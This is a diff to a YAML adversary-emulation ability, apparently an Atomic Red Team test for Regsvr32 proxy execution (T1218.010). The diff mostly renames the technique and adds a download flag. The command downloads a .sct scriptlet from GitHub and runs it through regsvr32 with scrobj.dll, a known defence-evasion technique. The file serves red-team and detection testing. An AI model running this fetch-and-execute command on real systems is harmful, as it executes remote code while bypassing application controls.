@@ -5,7 +5,7 @@
   tactic: stealth
   technique:
     attack_id: T1218.010
-    name: 'Signed Binary Proxy Execution: Regsvr32'
+    name: 'System Binary Proxy Execution: Regsvr32'
   platforms:
     windows:
       sh:
@@ -13,17 +13,18 @@
           {exit 0} else {exit 1}; then : ; else New-Item -Type Directory (split-path
           "PathToAtomicsFolder\T1218.010\src\RegSvr32.sct") -ErrorAction ignore |
           Out-Null; Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.010/src/RegSvr32.sct"
-          -OutFile "PathToAtomicsFolder\T1218.010\src\RegSvr32.sct"; fi; C:\Windows\system32\regsvr32.exe
-          /s /u /i:"PathToAtomicsFolder\T1218.010\src\RegSvr32.sct" scrobj.dll'
+          -OutFile "PathToAtomicsFolder\T1218.010\src\RegSvr32.sct" -UseBasicParsing;
+          fi; C:\Windows\system32\regsvr32.exe /s /u /i:"PathToAtomicsFolder\T1218.010\src\RegSvr32.sct"
+          scrobj.dll'
   plugin: atomic
   singleton: false
   repeatable: true
   delete_payload: false
   privilege: ''
   buckets:
-  - atomic-red-team
   - stealth
   - t1218.010
+  - atomic-red-team
   author: Atomic Red Team
   additional_info:
     input_arguments:
@@ -50,9 +51,9 @@
         ignore | Out-Null
 
         Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.010/src/RegSvr32.sct"
-        -OutFile "#{filename}"
+        -OutFile "#{filename}" -UseBasicParsing
 
         '
     technique_created: '2020-01-23T19:52:17.414Z'
     atomic_guid: 449aa403-6aba-47ce-8a37-247d21ef0306
-    import_timestamp: '2026-10-20T07:08:26.831121Z'
+    import_timestamp: '2026-10-21T07:01:49.578151Z'
